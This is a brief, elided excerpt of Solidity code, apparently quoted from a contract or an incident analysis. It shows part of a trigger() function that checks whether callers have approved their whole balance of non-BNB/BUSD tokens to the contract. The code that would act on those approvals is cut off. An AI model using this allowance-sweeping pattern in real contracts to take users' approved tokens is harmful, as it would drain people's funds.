    ...
    function trigger() external {
        ...
        for (uint i = 0; i < len;) {
            ...
            if (token1 != BNB && token1 != BUSD) {
                uint balance = IERC20(token1).balanceOf(msg.sender);
                if (IERC20(token1).allowance(msg.sender, address(this)) >= balance && balance > 100) {
            ...
            if (token0 != BNB && token0 != BUSD) {
                uint balance = IERC20(token0).balanceOf(msg.sender);
                if (IERC20(token0).allowance(msg.sender, address(this)) >= balance && balance > 100) {
